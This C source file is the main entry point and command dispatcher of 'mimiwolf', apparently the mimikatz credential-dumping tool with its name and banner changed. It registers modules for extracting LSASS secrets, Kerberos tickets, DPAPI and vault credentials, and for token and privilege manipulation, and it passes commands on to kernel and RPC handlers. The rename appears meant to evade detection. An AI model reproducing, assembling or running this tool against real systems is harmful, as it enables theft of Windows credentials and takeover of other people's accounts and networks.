#include "mimiwolf.h"

const KUHL_M * mimiwolf_modules[] = {
	&kuhl_m_standard,
	&kuhl_m_crypto,
	&kuhl_m_sekurlsa,
	&kuhl_m_kerberos,
	//&kuhl_m_ngc,
	&kuhl_m_privilege,
	&kuhl_m_process,
	&kuhl_m_service,
	&kuhl_m_lsadump,
	&kuhl_m_ts,
	&kuhl_m_event,
	&kuhl_m_misc,
	&kuhl_m_token,
	&kuhl_m_vault,
	//&kuhl_m_minesweeper,
#if defined(NET_MODULE)
	&kuhl_m_net,
#endif
	&kuhl_m_dpapi,
	//&kuhl_m_busylight,
	&kuhl_m_sysenv,
	&kuhl_m_sid,
	//&kuhl_m_iis,
	&kuhl_m_rpc,
	//&kuhl_m_sr98,
	//&kuhl_m_rdm,
	//&kuhl_m_acr,
};

int wmain(int argc, wchar_t * argv[])
{
	NTSTATUS status = STATUS_SUCCESS;
	int i;

	mimiwolf_begin();
	for(i = mimiwolf_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING) ; i++)
	{
		kprintf(L"\n" mimiwolf L"(" mimiwolf_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
		status = mimiwolf_dispatchCommand(argv[i]);
	}

	mimiwolf_end(status);
	return STATUS_SUCCESS;
}

void mimiwolf_begin()
{
	kull_m_output_init();
	kprintf(L"\nbanner\n");
	mimiwolf_initOrClean(TRUE);
}

void mimiwolf_end(NTSTATUS status)
{
	mimiwolf_initOrClean(FALSE);
	kull_m_output_clean();
}

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	mimiwolf_initOrClean(FALSE);
	return FALSE;
}

NTSTATUS mimiwolf_initOrClean(BOOL Init)
{
	unsigned short indexModule;
	PKUHL_M_C_FUNC_INIT function;
	long offsetToFunc;
	NTSTATUS fStatus;
	HRESULT hr;

	if(Init)
	{
		RtlGetNtVersionNumbers(&mimiwolf_NT_MAJOR_VERSION, &mimiwolf_NT_MINOR_VERSION, &mimiwolf_NT_BUILD_NUMBER);
		mimiwolf_NT_BUILD_NUMBER &= 0x00007fff;
		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if(FAILED(hr))
			PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
		kull_m_asn1_init();
	}
	else
		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);

	for(indexModule = 0; indexModule < ARRAYSIZE(mimiwolf_modules); indexModule++)
	{
		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (mimiwolf_modules[indexModule]) + offsetToFunc))
		{
			fStatus = function();
			if(!NT_SUCCESS(fStatus))
				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimiwolf_modules[indexModule]->shortName, fStatus);
		}
	}

	if(!Init)
	{
		kull_m_asn1_term();
		CoUninitialize();
		kull_m_output_file(NULL);
	}
	return STATUS_SUCCESS;
}

NTSTATUS mimiwolf_dispatchCommand(wchar_t * input)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWCHAR full;
	if(full = kull_m_file_fullPath(input))
	{
		switch(full[0])
		{
		case L'!':
			status = kuhl_m_kernel_do(full + 1);
			break;
		case L'*':
			status = kuhl_m_rpc_do(full + 1);
			break;
		default:
			status = mimiwolf_doLocal(full);
		}
		LocalFree(full);
	}
	return status;
}

NTSTATUS mimiwolf_doLocal(wchar_t * input)
{
	NTSTATUS status = STATUS_SUCCESS;
	int argc;
	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
	unsigned short indexModule, indexCommand;
	BOOL moduleFound = FALSE, commandFound = FALSE;
	
	if(argv && (argc > 0))
	{
		if(match = wcsstr(argv[0], L"::"))
		{
			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
			{
				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
					command = match + 2;
				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
			}
		}
		else command = argv[0];

		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimiwolf_modules)); indexModule++)
			if(moduleFound = (!module || (_wcsicmp(module, mimiwolf_modules[indexModule]->shortName) == 0)))
				if(command)
					for(indexCommand = 0; !commandFound && (indexCommand < mimiwolf_modules[indexModule]->nbCommands); indexCommand++)
						if(commandFound = _wcsicmp(command, mimiwolf_modules[indexModule]->commands[indexCommand].command) == 0)
							status = mimiwolf_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

		if(!moduleFound)
		{
			PRINT_ERROR(L"\"%s\" module not found !\n", module);
			for(indexModule = 0; indexModule < ARRAYSIZE(mimiwolf_modules); indexModule++)
			{
				kprintf(L"\n%16s", mimiwolf_modules[indexModule]->shortName);
				if(mimiwolf_modules[indexModule]->fullName)
					kprintf(L"  -  %s", mimiwolf_modules[indexModule]->fullName);
				if(mimiwolf_modules[indexModule]->description)
					kprintf(L"  [%s]", mimiwolf_modules[indexModule]->description);
			}
			kprintf(L"\n");
		}
		else if(!commandFound)
		{
			indexModule -= 1;
			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, mimiwolf_modules[indexModule]->shortName);

			kprintf(L"\nModule :\t%s", mimiwolf_modules[indexModule]->shortName);
			if(mimiwolf_modules[indexModule]->fullName)
				kprintf(L"\nFull name :\t%s", mimiwolf_modules[indexModule]->fullName);
			if(mimiwolf_modules[indexModule]->description)
				kprintf(L"\nDescription :\t%s", mimiwolf_modules[indexModule]->description);
			kprintf(L"\n");

			for(indexCommand = 0; indexCommand < mimiwolf_modules[indexModule]->nbCommands; indexCommand++)
			{
				kprintf(L"\n%16s", mimiwolf_modules[indexModule]->commands[indexCommand].command);
				if(mimiwolf_modules[indexModule]->commands[indexCommand].description)
					kprintf(L"  -  %s", mimiwolf_modules[indexModule]->commands[indexCommand].description);
			}
			kprintf(L"\n");
		}

		if(module)
			LocalFree(module);
		LocalFree(argv);
	}
	return status;
}

FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
{
    if((dliNotify == dliFailLoadLib) && ((_stricmp(pdli->szDll, "ncrypt.dll") == 0) || (_stricmp(pdli->szDll, "bcrypt.dll") == 0)))
		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
    return NULL;
}
#if !defined(_DELAY_IMP_VER)
const
#endif
PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;